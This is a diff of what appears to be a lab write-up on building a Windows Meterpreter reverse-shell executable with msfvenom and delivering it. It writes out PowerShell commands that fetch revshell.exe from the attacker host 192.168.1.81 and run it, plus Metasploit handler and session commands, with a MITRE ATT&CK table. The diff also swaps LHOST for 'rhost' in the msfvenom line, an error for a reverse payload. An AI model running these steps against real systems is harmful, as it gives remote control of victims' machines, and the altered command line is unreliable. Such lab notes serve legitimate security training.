@@ -25,7 +25,7 @@ Format: .exe
 
 bash (attacker):
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.81 LPORT=4444 -f exe -o revshell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp rhost=192.168.1.81 LPORT=4444 -f exe -o revshell.exe
 ```
 
 Delivery via PowerShell\
@@ -40,11 +40,16 @@ Fetch and execute on the Windows target:
 Powershell (victim):
 ````powershell
 Invoke-WebRequest http://192.168.1.81:8080/revshell.exe -OutFile revshell.exe
+````
+````powershell
 Start-Process revshell.exe
 ````
 Listener Setup
 
 bash(attacker):
+````bash
+msfconsole
+````
 ````bash
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -52,10 +57,19 @@ set lhost 192.168.1.81
 set lport 4444
 exploit -j
 ````
-Results:
-A Meterpreter session was successfully established on the attacker's system after execution.
+## Connect to shell
+````bash
+sessions
 
-MITRE ATT&CK Mapping
+sessions -i 1
+````
+````bash
+shell
+````
+## Results:
+###### A Meterpreter session was successfully established on the attacker's system after execution.
+
+## MITRE ATT&CK Mapping
 
 | Technique	           |  ID           |
 | -------------------- | ------------- |
